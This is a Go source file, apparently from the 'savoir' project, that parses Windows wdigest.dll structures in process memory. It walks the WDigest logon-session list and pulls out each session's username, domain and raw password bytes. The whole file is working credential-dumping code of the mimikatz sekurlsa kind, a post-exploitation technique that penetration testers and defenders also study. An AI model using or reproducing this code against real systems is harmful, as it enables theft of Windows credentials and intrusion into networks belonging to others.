package wdigest

import (
	"github.com/vincd/savoir/modules/sekurlsa/packages/globals"
	"github.com/vincd/savoir/utils"
)

func ParseWDigest(l utils.MemoryReader) ([]*globals.SavoirCredential, error) {
	wdigestEntry, reference, err := globals.FindStructurePointerFromSignature(l, "wdigest.dll", wdigestSignatures)
	if err != nil {
		return nil, err
	}

	entries := make([]*globals.SavoirCredential, 0)
	ptr := *wdigestEntry
	for ptr > 0 {
		entry := &KiwiWDigestListEntry{}
		if err := l.ReadStructure(ptr, entry); err != nil {
			return nil, err
		}

		if entry.Flink == *wdigestEntry {
			break
		}

		credentials := &globals.KiwiGenericPrimaryCredential{}
		if err := l.ReadStructure(entry.This.WithOffset(reference.Offsets[1]), credentials); err != nil {
			return nil, err
		}

		username, err := credentials.UserName.ReadString(l)
		if err != nil {
			return nil, err
		}

		domain, err := credentials.Domain.ReadString(l)
		if err != nil {
			return nil, err
		}

		passwordRaw, err := credentials.Password.ReadBytes(l)
		if err != nil {
			return nil, err
		}

		entries = append(entries, &globals.SavoirCredential{
			AuthenticationId: entry.LUID,
			Username:         username,
			Domain:           domain,
			PasswordRaw:      passwordRaw,
		})

		ptr = entry.Flink
	}

	return entries, nil
}
